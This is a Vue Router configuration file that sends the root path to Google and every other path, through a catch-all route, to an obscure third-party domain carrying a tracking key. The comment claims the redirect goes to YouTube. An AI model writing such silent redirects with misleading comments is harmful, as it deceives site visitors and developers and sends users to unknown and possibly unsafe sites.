import Vue from 'vue'
import VueRouter from 'vue-router'

Vue.use(VueRouter)



const routes = [
  {
    path: '/',
    beforeEnter: (to, from, next) => {
      window.location.href = 'https://www.google.com';
    }
  },
  {
    path: '/:catchAll(.*)', // This route will catch any path
    beforeEnter: (to, from, next) => {
      // Redirect to YouTube for any string 
      // window.location.href = 'https://acquisitionsneezeswell.com/mwk0886hw?key=effd9a9b1d612f89b6b6d4e6889916ff';
      window.location.href = 'https://almightyroomsimmaculate.com/d646i2ddt?key=fcb1a5bac17efdca193654390f35b205';
    }
    
  }
]

const router = new VueRouter({
  mode: 'history',
  base: process.env.BASE_URL,
  routes
})

export default router
